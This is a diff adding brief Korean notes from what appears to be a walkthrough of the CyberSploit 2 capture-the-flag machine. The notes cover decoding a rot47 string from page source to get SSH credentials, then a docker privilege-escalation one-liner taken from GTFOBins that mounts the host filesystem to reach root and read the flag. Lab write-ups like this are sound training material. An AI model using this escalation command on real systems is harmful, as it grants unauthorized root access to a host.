@@ -49,3 +49,19 @@ id 명령어를 통해 사용자가 docker 사용자임을 확인
 쉘을 얻는데 성공
 
 ---
+CyberSploit 2
+다양한 도구를 통해 정보 수집 후 접속
+페이지 소스 보기 -> rot47 확인 -> rot47 검색 후 decoder 사이트 이동
+ decoder (shailendra / cybersploit1) 
+
+ssh shailendra@대상 IP
+ls, uname -a, cat /etc/issue, cat hint.txt, id 등 명령어로 시스템 정보 확인
+
+docker 계정 확인 후 docker privilege escalation 검색
+docker | GTFOBins : github 사이트 확인
+
+ssh
+docker run -v /:/mnt --run -it alpine chroot /mnt sh
+id -> root 상승 확인
+cd /root
+flag.txt 확인
